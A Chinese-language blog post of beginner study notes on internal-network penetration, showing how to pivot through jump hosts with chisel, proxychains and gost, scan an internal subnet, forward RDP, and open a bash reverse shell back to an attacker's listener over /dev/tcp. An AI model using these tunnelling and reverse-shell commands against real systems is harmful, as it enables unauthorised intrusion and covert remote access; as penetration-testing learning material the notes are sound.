---
title: 内网安全学习「1」
published: 2026-03-23
pubDate: 2026-03-23
description: 内网安全 zsm
pinned: false
tags: ["内网安全"]
author: zsm
category: 渗透
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

不会内网打不了一点，学点基础的先

## 代理配置

这里个人用的`chisel+proxychains`

### 单跳

攻击机开服务

> chisel server -p 8000 --reverse

跳板机连接

> chisel client VPS:8000 R:1080:socks
> 或者是
> chisel client VPS:8000 R:0.0.0.0:1080:socks

配置 proxychains

这个默认配置文件需要看自己的下载方式()，brew安装的在`/opt/homebrew/etc/proxychains.conf`

> socks5 127.0.0.1 1080

改一下就行，然后你的后续操作带着他就行，比如

> proxychains nmap 10.10.10.0/24

### 多跳

一般是`攻击机 → 跳板1 → 跳板2 → 内网`

主要不同的点在于你要从攻击机连接到跳板2，一般来说在跳板1上面开个`server`去连接，跳板2上开`client`，然后端口要和第一层的一样，然后再去`/opt/homebrew/etc/proxychains.conf`加一行就行了

这个时候弹跳板机2的shell

跳板机1

> chisel server --reverse --port 1234

攻击机

> chisel client 192.168.244.128:1234 R:1337:127.0.0.1:1337 &
> nc -lvnp 1337

跳板机2

> /bin/bash -i >& /dev/tcp/192.168.32.3/1337 0>&1

## gost

感觉这玩意更加现代

攻击机

> gost -L socks5://:1080

跳板机

> gost -L socks5://:1081 -F socks5://VPS:1080

端口转发

> gost -L tcp://:3389/10.10.10.5:3389

### 多级代理

一行梭哈

> gost -L socks5://:1080 \

     -F socks5://jump1:1081 \
     -F socks5://jump2:1082

### TCP不出网

攻击机

> gost -L http://:8080

目标机

> gost -L socks5://:1080 -F http://VPS:8080
